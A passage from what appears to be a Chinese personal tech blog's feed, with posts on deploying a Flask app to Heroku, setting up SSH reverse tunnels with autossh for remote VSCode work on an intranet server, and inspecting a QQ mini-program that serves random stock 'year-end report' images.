href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.heroku.com%2F" target="_blank" rel="noopener">https://www.heroku.com/</a></p><p>略。建议用gmail，不过也看到用国内邮箱也成功的。  </p></li></ol><ol start="2"><li><p><strong>安装Heroku CLI 命令行接口</strong></p><p>Win-x64：<a href="https://cli-assets.heroku.com/heroku-x64.exe" target="_blank" rel="noopener">下载地址</a></p><p>其他环境的见官网好了。<a href="https://devcenter.heroku.com/articles/heroku-cli" target="_blank" rel="noopener">https://devcenter.heroku.com/articles/heroku-cli</a></p><p>安装完之后就可以在命令行用<code>heroku</code>命令了。</p></li></ol><ol start="3"><li><p><strong>登录</strong></p><pre class=" language-bash"><code class="language-bash">heroku login</code></pre><p>会弹出网页登录验证，或者在命令行登录。</p></li></ol><ol start="4"><li><p><strong>准备好app</strong></p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/image-20191229023615517.png" alt="支持的app"></p><p>你看他支持的语言挺多的呢。</p><p>我这里用到的就是python啦。</p><p>这个在上一节已经搭建好了喵。</p></li></ol><ol start="5"><li><p><strong>创建app</strong></p><pre class=" language-bash"><code class="language-bash">heroku create</code></pre><p>这时候同时建立了一个名为<code>heroku</code>的git remote仓库，连接到了你本地的git仓库。</p><p>当然也可以现在网站上创建一个应用，再clone</p><pre class=" language-bash"><code class="language-bash">heroku git:clone -a nuaaical<span class="token function">cd</span> nuaaical</code></pre><p>这里前提是建立好了名为<code>nuaaical</code>的应用了。</p></li><li><p><strong>建立依赖相关的<code>requirements.txt</code></strong></p><p>略。</p></li></ol><ol start="7"><li><p><strong>指定执行的入口</strong></p><p><strong>这里算是一个坑吧，折腾了好久才发现。</strong></p><p>你必须先在代码目录下建立一个名为<code>Procfile</code>的文件，在里面写上你要他执行的命令。比如执行一个python文件之类的。</p><p>在这里用的是<code>gunicorn</code>来建立一个web应用。（flask只用于本地测试使用</p><pre><code>web: gunicorn web:app</code></pre><p>第二个<code>web</code>是文件名（<code>web.py</code>），<code>app</code>是flask实例化的对象啦。<br>（代码里写的<code>app = Flask(__name__)</code>  </p></li></ol><ol start="8"><li><p><strong>指定用构建语言（可略？）</strong></p><pre class=" language-bash"><code class="language-bash">heroku buildpacks:set heroku/python</code></pre><p>显示指定用python来构建打包（网上有的说不指定会报错？</p></li></ol><ol start="9"><li><p><strong>部署代码</strong></p><p>终于可以部署了呀！直接push好了。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> push heroku master</code></pre><p>如果不行的话加上<code>-f</code>强制push<strong>（小心一点）</strong>。</p><p>然后可以看到部署的日志，如果有问题就再看看。</p><p>没问题的话，效果类似下面的。</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/push.png" alt="push"></p></li></ol><ol start="10"><li><p><strong>看看你的网站吧</strong></p><pre class=" language-bash"><code class="language-bash">heroku <span class="token function">open</span></code></pre><p>然后会调用你的浏览器打开。</p><p>或者自己在浏览器访问就好了。</p></li></ol><p><strong>嘻嘻嘻，到这就结束啦~</strong></p><p><br><br></p><h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><p>当然还有一些<strong>常用命令</strong>，比如：</p><ul><li><p>查看日志<strong>(debug必备了)</strong></p><pre class=" language-bash"><code class="language-bash">heroku logs --tail</code></pre></li><li><p>看一下还有多少剩余时长</p><pre class=" language-bash"><code class="language-bash">heroku <span class="token function">ps</span></code></pre></li><li><p>打开app服务</p><pre class=" language-bash"><code class="language-bash">heroku ps:scale web<span class="token operator">=</span>1</code></pre></li><li><p>关闭app服务</p><pre class=" language-bash"><code class="language-bash">heroku ps:scale web<span class="token operator">=</span>0</code></pre></li><li><p>etc.</p></li></ul><blockquote><p>官方文档<code>Getting Started on Heroku</code>看这里 <a href="https://devcenter.heroku.com/start" target="_blank" rel="noopener">https://devcenter.heroku.com/start</a></p></blockquote><p><br><br></p><p>除此以外，Heroku还支持<code>pipeline</code>，还可以授权从GitHub上同步部署，还有容器啥的……</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/image-20191229033131933.png" alt=""></p><p>感觉还是挺不错的呢！  </p><p><br><br></p><hr><h2 id="Achievements"><a href="#Achievements" class="headerlink" title="Achievements"></a>Achievements</h2><p>部署好的web端网址：</p><p><a href="https://nuaaical.herokuapp.com/" target="_blank" rel="noopener">https://nuaaical.herokuapp.com/</a></p><p><strong>欢迎来试试呀！</strong></p><p>第一次访问可能会花一些时间，等一等吧。</p><p>如果不成功的话刷新一下页面（但不要重复提交登录信息），或重新开一个页面访问。</p><p>同时多人访问的话也可能会有问题（没试过），那就再试试吧。（摊手</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/frontend.png" alt="前端"></p><blockquote><p>好了我知道这个页面丑了。现学的HTML，别说了。</p><p>其实之前奶冰奶冰奶冰冰做了一个前端的↓ </p><p>后面再折腾吧咕咕咕</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/frontend_vue.png" alt="vue.js前端"></p><p><strong>欢迎来贡献代码呀！</strong></p></blockquote><blockquote><p>其实之前还折腾了老半天，尝试了<strong>在Azure上部署</strong>，也成功了。</p><p>需要在VSCode中进行部署，然后在配置里设好启动命令（也可以是一个文件）。</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/Azure_deploy.png" alt="Azure_deploy"></p><p>不过现在Azure服务到期了。部署的网站也停止了呢。</p><p>截个图纪念一下吧。</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/Azure_website.png" alt="Azure_website"></p><p>（hackathon的时候白嫖的Azure还是挺爽的233  </p></blockquote><p>同时，<strong>代码开源在GitHub上了。欢迎来点个star，提个PR喵！</strong>   </p><p><a href="https://github.com/miaotony/NUAA_iCal_Web" target="_blank" rel="noopener">https://github.com/miaotony/NUAA_iCal_Web</a></p><p><br><br></p><p><strong><em>仅供学习研究，未经允许禁止商用，谢谢。</em></strong></p><p>文章中不免存在问题，欢迎提出。  </p><br><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li><a href="https://devcenter.heroku.com/" target="_blank" rel="noopener">https://devcenter.heroku.com/</a></li><li><a href="https://www.jianshu.com/p/191248ad2639" target="_blank" rel="noopener">https://www.jianshu.com/p/191248ad2639</a></li></ol><p><br><br></p><blockquote><p>浪够了，继续准备考试。（真难顶……</p><p>期末冲冲冲！</p><p>说不定这是今年最后一篇blog了喵。</p><p>溜了溜了。</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> WEB </tag>
            
            <tag> iCal </tag>
            
            <tag> Heroku </tag>
            
            <tag> 部署 </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 基于VSCode和ssh实现远程编程/炼丹</title>
      <link href="/2019/12/21/Idea_RemoteProgramming/"/>
      <url>/2019/12/21/Idea_RemoteProgramming/</url>
      
        <content type="html"><![CDATA[<h2 id="Cause"><a href="#Cause" class="headerlink" title="Cause"></a>Cause</h2><p>在内网有一台服务器，能连接外网但由于没有公网 IP 而无法在外网直接访问，之前想要在上面跑程序的时候，就得通过远程桌面进行操作。虽然 <code>Teamviewer</code> 速度还可以，但总感觉有点不太爽……  </p><p>很久以前（大概一两个月前）就在逼乎上看到过一篇文章说可以</p><blockquote><p><strong>使用vscode进行远程炼丹</strong>  <em>（原文见 Reference #1</em></p></blockquote><p>噫！我来兴趣了，而且其实早就想试试了，然而之前在忙别的没空折腾<del>（其实现在也没空）</del>，就是前几天在配服务器环境的时候<del>（麻烦到爆炸，最讨厌配环境了）</del>，一想干脆就再折腾一下，弄好远程炼丹（编程）吧。  </p><p>于是乎就这样连Linux命令都不知道几个的憨憨瞎折腾了一两天的ssh，终于实现了远程炼丹，<strong>贼有成就感嘻嘻嘻</strong>。</p><p>其中遇到了一些奇怪的问题，简单记录一下，也方便我忘了再回来看看吧。</p><p>时间有限，VSCode的部分就大概提一下思路，<strong>重点是<code>ssh</code>的部分</strong>吧……   </p><h2 id="Guidance-for-ssh"><a href="#Guidance-for-ssh" class="headerlink" title="Guidance for ssh"></a>Guidance for ssh</h2><p>不妨假设如下，<strong>记清楚了噢，后面频繁用到的</strong>。</p><table><thead><tr><th>computer</th><th>IP/address</th><th>info</th></tr></thead><tbody><tr><td>内网服务器A</td><td>172.x.x.x</td><td>可以访问外网，但外网不能直接访问A</td></tr><tr><td>公网服务器B</td><td>test.com</td><td>可以访问外网，也可被外网访问</td></tr><tr><td>能够联网的主机C</td><td>-</td><td>想要在C上对A进行访问</td></tr></tbody></table><h3 id="内网服务器A上的设置"><a href="#内网服务器A上的设置" class="headerlink" title="内网服务器A上的设置"></a>内网服务器A上的设置</h3><p>A设置反向代理到B的 port1 端口  </p><blockquote><p>工作原理：<br>1、本地主机和远程主机建立连接；<br>2、远程主机上分配了一个 socket 侦听 port 端口；<br>3、远程端口上有了连接, 该连接就经过安全通道转向本机的端口。   </p><p>备注：root 登录远程主机才能转发特权端口。</p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> -fCNR <span class="token operator">&lt;</span>port1<span class="token operator">></span>:localhost:22 usr_b@test.com -p 22</code></pre><blockquote><p>-R port1:host:port2 将远程机器的端口映射到本地。port1是公网服务器B的端口，host为本地A的IP，port2是A要映射到公网的端口。<br><code>usr_b@test.com</code> 用户名@服务器B地址，表示连接到B，以用户<code>usr_b</code>登录。当然<code>test.com</code>也可以是IP地址啦。<br>-f SSH客户端在后台运行<br>-C 允许压缩<br>-g 允许远程主机可远程访问，这里有坑。  （但<code>autossh</code>没有这个选项所以应该影响不大）<br>-N Do not execute a shell or command. 不执行脚本或命令，通常与-f连用。<br>-p 22 表示指定连接到B的22端口，默认就是22啦，如果不是的话设置成B的ssh端口。   </p></blockquote><p>注意一下，<em>（网上说）</em>这里有个坑，-g还需要在公网服务器B做下面的设置，设置完后再重启服务。</p><pre class=" language-bash"><code class="language-bash">＃vim /etc/ssh/sshd_config 新增GatewayPorts <span class="token function">yes</span></code></pre><hr><h4 id="进阶1-autossh"><a href="#进阶1-autossh" class="headerlink" title="进阶1  autossh"></a><strong>进阶1  autossh</strong></h4><p>由于ssh会自动断开连接，于是<strong>利用自动重连工具<code>autossh</code>，保证连接稳定</strong>。</p><p>首先安装autossh，这里我用的是CentOS系统。其他类似的。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> yum -y <span class="token function">install</span> autossh</code></pre><blockquote><p>其实我发现yum（的源里）找不到autossh，后来是用wget下载然后手动安装的…</p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token function">screen</span> -S reverse_proxyautossh -M <span class="token operator">&lt;</span>port2<span class="token operator">></span> -CNR <span class="token operator">&lt;</span>port1<span class="token operator">></span>:localhost:22 usr_b@test.com</code></pre><p>多了个-M参数，表示从B的port2检测是否断线。同时autossh会在后台运行，-f也不需要了。  </p><p>这里的screen用于命令行终端切换，给这个界面起了个名叫<code>reverse_proxy</code>，当然没有装screen的话也需要装一下，不过不执行screen这条语句理论上也能用。</p><p><strong>注意，port1和port2均需要在B的安全组内设好规则，允许外网访问。</strong>  </p><p>而后看一下有没有运行↓</p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220021730475.png" alt="看一下进程"></p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220022409722.png" alt="netstat看一下"></p><p>可见A已和B建立连接。<br>此处port1为9999，port2为9998，仅用于演示，你完全可以看心情选择你喜欢的端口，当然有的端口有特定功能另外说。  </p><hr><h4 id="进阶2-开机自启"><a href="#进阶2-开机自启" class="headerlink" title="进阶2  开机自启"></a><strong>进阶2  开机自启</strong></h4><p>当然，为了连接再可靠一点，确保A重启后还可以连上，可以在A上再设置一下<strong>开机自动启动autossh</strong>。</p><p>有一种方法是在<code>/etc/rc.local</code>里面添加如下内容</p><pre class=" language-bash"><code class="language-bash"><span class="token function">su</span> - user_a -c <span class="token string">"autossh -i /home/user_a/.ssh/id_rsa -o BatchMode=yes -M &lt;port2> -CNR &lt;port1>:localhost:22 usr_b@test.com"</span></code></pre><p>其中，<code>-i</code>后接的是SSH_KEY_FILE_PATH，即私钥地址，root用户默认为<code>/root/.ssh/id_rsa</code>。<br><code>user_a</code>是A上的用户，且要求在公网服务器B上，已经有了A主机上用户user_a的公钥<em>（这个在下面B的设置中介绍）</em>。</p><p>然后记得给这个文件赋予<strong>可执行</strong>权限。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">chmod</span> +x /etc/rc.d/rc.local</code></pre><p>不过看这个文件注释里的说法，好像这个方法不推荐了。  </p><p>当然<strong>还可以使用其他的配置开机自启的方法</strong>，我也刚折腾对Linux也不熟，后面再看看吧。  </p><p>现在你可以<code>reboot</code>试一下了，前提是你能确保用这台服务器的其他人没意见，重要数据记得保存好噢。   </p><p>这样A上的设置就告一段落了，下面看公网服务器B。  </p><hr><h3 id="公网服务器B上的设置"><a href="#公网服务器B上的设置" class="headerlink" title="公网服务器B上的设置"></a>公网服务器B上的设置</h3><p>如果只需要在B上对A进行远程炼丹，那就不需要在B上设置啥了，现在<strong>直接ssh就完事了</strong>。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> -p <span class="token operator">&lt;</span>port1<span class="token operator">></span> localhost</code></pre><p>因为已经把A的ssh对应的22端口映射到B的port1端口了呀！  </p><p>试一下果然如此。  </p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220023008851.png" alt="在B上ssh连接A"></p><h4 id="进阶-免密登录"><a href="#进阶-免密登录" class="headerlink" title="进阶  免密登录"></a>进阶  免密登录</h4><p>这样每次登录都需要输入密码，是有点麻烦了。</p><p>这有个办法，就是把本机的ssh公钥复制到要登录的服务器A的<code>~/.ssh/authorized_key</code>文件中，实现免密登录。</p><p>什么，你还觉得太麻烦了？？？</p><p>这里还有一个快办法，就是在B上登录A后执行这个——</p><pre class=" language-bash"><code class="language-bash">ssh-copy-id -i .ssh/id_rsa.pub  usr_a@172.x.x.x</code></pre><blockquote><p>-i 指向本地的公钥文件，一般在用户的目录下。<br><code>usr_a</code> 为A上要登录的用户名</p></blockquote><p>然后就可以从B免密登录内网服务器A啦。你现在可以在B上ssh试一下，理论上直接就已经登录好了呢！  </p><hr><h3 id="在任意一台联网主机C对A进行访问的实现"><a href="#在任意一台联网主机C对A进行访问的实现" class="headerlink" title="在任意一台联网主机C对A进行访问的实现"></a>在任意一台联网主机C对A进行访问的实现</h3><p>到这里我有点成就感了，<strong>远程炼丹实际上已经实现了</strong>。  </p><p>然而我的初衷是要<strong>在一台能联网的主机C上去连接内网A</strong>的呀，不行还得再折腾一下啊呜。  </p><p>首先试了一下直接连接公网服务器B的port1，然而不可行。  </p><p>不过网上有些资料说是可行的，这个我也不知道呢，可能要问神奇的海螺吧。   </p><blockquote><p>根据网上的说法，已经在B上对<code>GatewayPorts</code>进行了设置，也杀死进程重启了服务甚至直接<code>reboot</code>了，然而不知道为啥不可行……</p></blockquote><p>不过也不是没有办法呢，ssh里还有个<strong>正向代理</strong>闲着没事干呢，说上就上吧。  </p><p>在B上继续进行如下配置</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> -fCNL  *:<span class="token operator">&lt;</span>port3<span class="token operator">></span>:localhost:<span class="token operator">&lt;</span>port1<span class="token operator">></span> localhost</code></pre><p>表示将B上的port1映射到port3，注意<strong>port3也要设置安全组规则</strong>啊。  </p><p>用<code>ss -ant</code> 看了一下，port3的确打开了。  </p><p>理论上这样的话在C上ssh连接B的port3端口，就可以直接访问到内网A了的。</p><p>如果你成功了，那就可以<strong>直接跳到配置VSCode的部分</strong>了，<strong>尽情享受远程炼丹的快感吧！</strong>  </p><p><strong>喜欢的话可以滑到页面下方，赞赏一下给我买点好吃的<em>（我饿了.jpg</em></strong>    </p><hr><p><strong>然而我并没有成功……</strong>  </p><p>看了一下安全组设置，没问题，唉，大不了全开了嘛。还是不行。  </p><p>这里我难受死了，杀死进程又重来试了好几次，一样没有效果。  </p><p>再去网上查了查，直到看到一篇文章里提到了这个问题，但他直接用的ssh而没有用到autossh，用他的方案还是没解决问题。不过里面提到了一个命令叫<code>lsof</code>，即“列出打开文件(lists openfiles)”，而在Unix中一切（包括网络套接口）都是文件。<strong>这可是个神器啊！</strong>  </p><p>这里用到的是     </p><blockquote><p>使用<code>-i :port</code>来显示与指定端口相关的网络信息。  </p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token function">lsof</span> -i :<span class="token operator">&lt;</span>port3<span class="token operator">></span>  <span class="token comment" spellcheck="true"># 查看连接port3端口的网络信息</span></code></pre><p>结果类似于这样（忘记截图了），此处port3为仅供演示所用的9988。</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># lsof -i :9988</span>COMMAND PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME<span class="token function">ssh</span>     658 root    4u  IPv6  146251      0t0  TCP *:9988 <span class="token punctuation">(</span>LISTEN<span class="token punctuation">)</span></code></pre><p>这里我才发现，噫，怎么只监听了IPv6，而没有IPv4啊！</p><p>实际上通过<code>ss -ant</code>也可以发现对应的端口只有tcp6而没有tcp…  </p><p>然而阿里云实例（安全组内）只有IPv4出口来着，而且也是通过IPv4连接到B的，怪不得连不上呢。（佛了  </p><p>不过也奇怪了，理论上ssh应该v4和v6都监听的吧。  </p><p>去查了一下ssh命令，这次<strong>强制使用 IPv4</strong>试试。  </p><p>（在B上杀死之前的ssh，再执行下面的命令。记得改成你的端口哈。  </p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> -fCNL  *:<span class="token operator">&lt;</span>port3<span class="token operator">></span>:localhost:<span class="token operator">&lt;</span>port1<span class="token operator">></span> localhost -4</code></pre><blockquote><p><code>-4</code>表示强制使用IPv4</p></blockquote><p>这回再看<code>lsof -i :&lt;port3&gt;</code>：  </p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># lsof -i :9988</span>COMMAND PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME<span class="token function">ssh</span>     954 root    4u  IPv4  255331      0t0  TCP *:9988 <span class="token punctuation">(</span>LISTEN<span class="token punctuation">)</span></code></pre><p>然后再在C上连接B的port3端口。</p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220021132045.png" alt="通过外网成功连上内网服务器"></p><p>哇哇哇成功了！  </p><p>看来果然是这个问题啊我哭了又笑了。  </p><p>下面就可以设置VSCode来实现远程炼丹啦！  </p><h2 id="Guidance-for-VSCode"><a href="#Guidance-for-VSCode" class="headerlink" title="Guidance for VSCode"></a>Guidance for VSCode</h2><p>具体可以参考<em>Reference #1</em>，这里简单操作一下。  </p><p>在VSCode安装<strong><code>Remote Development</code>开发包（扩展）</strong>，然后在远程资源管理器里新增一个SSH Target。  </p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220011642994.png" alt="VSCode_ssh配置"></p><p>在用户的<code>.ssh/config</code>文件内新增你的内网炼丹炉信息。</p><blockquote><p>Host 给你的内网主机起个名（看你心情随意取）<br>HostName  公网服务器B的IP或域名<br>Port 填port3，如果port1能连上就填port1<br>User 填内网服务器A的登录用户名    </p></blockquote><p>保存，然后便可以连接试一试了。  </p><p>连接后输入A对应用户的密码，然后就连上了。打开文件夹还需要再输一次密码。   </p><p>现在再用前面在B的配置里说的办法，把C主机的公钥放到A里就可以实现免密登录啦！   </p><p>呐，这就是在C上连接到内网炼丹炉的效果了↓。</p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220011440883.png" alt="VSCode远程炼丹效果"></p><p>网络延时几乎没有<em>（不过也取决于网络环境）</em>，和在本地编程几乎没有差别，爽到爆炸！  </p><p>哇哇哇成就感爆棚啊哇哇哇！！！</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>时间因素，不可避免可能存在一些失误之处，其中也有不少可以拓展之处，欢迎交流提出哈。  </p><p>本文<strong>仅用于学习研究，请在合理合法范围内使用</strong>，</p><p><strong>未经允许不得商用，转载请署名MiaoTony并保留本文链接</strong>，谢谢。</p><p>说点题外话吧。  </p><blockquote><p>上周末到这周部署<a href="https://github.com/miaotony/NUAA_iCal_Web" target="_blank" rel="noopener"><code>NUAA_iCal_Web</code>在线版本</a>弄了一周末（好菜啊第一次弄部署来着…），配服务器环境折腾了老半天（甚至只装好了GPU驱动和anaconda还没配CUDA），配远程炼丹又瞎折腾了一两天，写这篇文章又断断续续地花了好几个小时。  </p></blockquote><p>呜下周开始频繁考试了，不敢瞎折腾了嘤嘤嘤。（溜了溜了   </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li><a href="https://zhuanlan.zhihu.com/p/89662757" target="_blank" rel="noopener">使用vscode进行远程炼丹</a> </li><li><a href="https://www.cnblogs.com/zhongbin/p/3940956.html" target="_blank" rel="noopener">SSH反向连接使用Autossh自动ssh</a>  </li><li><a href="https://www.jianshu.com/p/3cd2793ba719" target="_blank" rel="noopener">利用阿里云ECS跳板机内网穿透- ssh</a> </li><li><a href="https://www.centos.bz/2017/08/ssh-reverse-proxy/" target="_blank" rel="noopener">SSH如何反向代理稳定穿透内网</a></li><li><a href="https://zhuanlan.zhihu.com/p/57477087" target="_blank" rel="noopener">内网穿透：在公网访问你家的 NAS</a>   （还包括<code>frp</code>相关）</li><li><a href="https://www.jianshu.com/p/85866b87c7d0" target="_blank" rel="noopener">从外网 SSH 进局域网，反向代理+正向代理</a></li><li><a href="https://www.jianshu.com/p/7accc1e485d3" target="_blank" rel="noopener">autossh 穿透，反向代理到内网</a></li><li><a href="https://blog.csdn.net/liu_qingbo/article/details/78383892" target="_blank" rel="noopener">ssh-copy-id三步实现SSH无密码登录和ssh常用命令</a></li><li><a href="https://www.jianshu.com/p/a3aa6b01b2e1" target="_blank" rel="noopener">Linux 命令神器：lsof</a></li><li><a href="https://www.oschina.net/translate/automatically-restart-ssh-sessions-and-tunnels-using-autossh" target="_blank" rel="noopener">使用 autossh 自动重启 SSH 会话和通道</a></li><li><a href="https://www.fcwys.cc/archives/371.html" target="_blank" rel="noopener">CentOS7添加开机启动服务或脚本</a></li></ol><p>etc.   </p><p>非常感谢上面这些文章，给了我很多启发呢。  </p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> Server </tag>
            
            <tag> ssh </tag>
            
            <tag> VSCode </tag>
            
            <tag> 远程 </tag>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | QQ小程序【年终报告单/2019年终总结】分析</title>
      <link href="/2019/12/04/Scrapy_2019Year-end_Report/"/>
      <url>/2019/12/04/Scrapy_2019Year-end_Report/</url>
      
        <content type="html"><![CDATA[<h2 id="缘由"><a href="#缘由" class="headerlink" title="缘由"></a>缘由</h2><p>这两天看空间各种发【我的2019年终报告】，然后我也去测了一下，没想到啥也不用填，申请获取个人信息的权限，报告就出来了。  </p><p>然而弹出一个遮罩层让你先看个15s的广告……  </p><p>超想吐槽，包括页面下面的广告。。  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/movie.png" alt="movie"></p><p>然后看完广告，终于出来了。  </p><p>正当我截了图返回之后，噫换个性别试试。  </p><p>好，这回不一样了呀！  </p><p>然后再来一次，噫，又不一样了……这让我怀疑他就是假的几张图片而已吧。  </p><p>我兴趣来了，不如来折腾一下，分析一下这个小程序吧。  </p><p>（不折腾会死……</p><h2 id="开始折腾"><a href="#开始折腾" class="headerlink" title="开始折腾"></a>开始折腾</h2> <a id="more"></a> <h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>先来看一看这个小程序的设置，发现只获取了<strong>用户信息</strong>。看一眼<strong>更多资料</strong>——  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image1.png" alt="image1"></p><p>先确定了这是个个人开发的小程序，看相关的域名除了Tencent家的，主要就是<code>wxa.game-a1.cn</code> 和<code>free-api.heweather.com</code>。  </p><p>查了一下，后者是一个查天气的API（需要的话可以用一波）<em>（就是很迷惑为啥这里会有这个</em>  </p><p>前者是一个个人的域名吧，看样子是用的一个开发小程序的平台。根域名还是个博客，里面还有搭建微信小程序的经历。</p><hr><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>ping了一下这个域名，得到IP：<code>47.105.42.112</code>  </p><p>然后抓了个包，过滤只看关于这个IP的数据包。发现有两个。  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/Inked.jpg" alt="Inked"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image2.png" alt="2"></p><p>前面一个不懂什么鬼填了个表，估计收集了一波使用数据，先不管。重点是后面这个。</p><p>很明显是访问了<code>http://wxa.game-a1.cn/wxa/qqnz2019/index.php</code>这个网址。</p><hr><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>浏览器启动，F12大法好呀。  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image3.png" alt="image-20191204143118444"></p><p>好一个JSON字符串，来分析一下吧。  </p><p><code>qrcode</code>很明显是二维码啦，下载下来解码发现调用了qq小程序的接口吧，访问会跳转到这个小程序。</p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image4.png" alt="image-20191204143437363"></p><p><code>url</code>和<code>url1</code>都是一样的，指向了一个阿里云的对象存储。↓</p><p><a href="https://oos-pic.oss-cn-beijing.aliyuncs.com/2019%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/1.png" target="_blank" rel="noopener">https://oos-pic.oss-cn-beijing.aliyuncs.com/2019%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/1.png</a></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image5.png" alt="image-20191204143738991"></p><p>多次刷新发现好像的确就那几张图片，改变了一下<code>x.png</code>而已。  </p><p>而且的确这就是假的图啦。<em>（不然哪来的用户数据可以分析</em>  </p><hr><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>既然都知道是几张图片而已了，那顺便就爬下来吧。  </p><p>PyCharm 启动，来写一写jio本。  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/code.png" alt="image-20191204150348574"></p><p>写range是因为随便试了一下，本来就没有几张图片而已，然而懒得手动下载。</p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/download_imgs.png" alt="image-20191204144246023"></p><p>看结果的确就7张图片。。</p><p>呐就这几张了↓  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/1.png" alt="1"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/2.png" alt="2"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/3.png" alt="3"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/4.png" alt="4"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/5.png" alt="5"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/6.png" alt="6"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/7.png" alt="7"></p><hr><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p>看样子小程序获取个人头像，然后再和二维码、上面的任意一张图拼接在一起而已吧。   </p><p>就是这个<code>form.php</code>，看样子是用来统计使用数据的吧emmm问题不大。</p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image6.png" alt="image-20191204144935029"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>哇呜折腾了一个中午好气啊，<del><em>（有毒 不折腾会死</em></del></p><p>不管怎么说这个小程序还是有点意思的，至少做的那几张图片还挺不错的哈哈哈。</p><p>不过要吐槽这个广告超级讨厌emmm</p><p>就这样吧。</p><p>爬取图片的源码 和 爬到的图片放到了Github上了，有需要的可以去看看吧。</p><p>URL：<a href="https://github.com/miaotony/Scrapy_2019Year-end_Report" target="_blank" rel="noopener">这是网址</a></p><p><a href="https://github.com/miaotony/Scrapy_2019Year-end_Report" target="_blank" rel="noopener">https://github.com/miaotony/Scrapy_2019Year-end_Report</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> Python </tag>
            
            <tag> 分析 </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> 小程序 </tag>
            
            <tag> 年终总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>纪念一下忙到爆炸超级难顶的十一月</title>
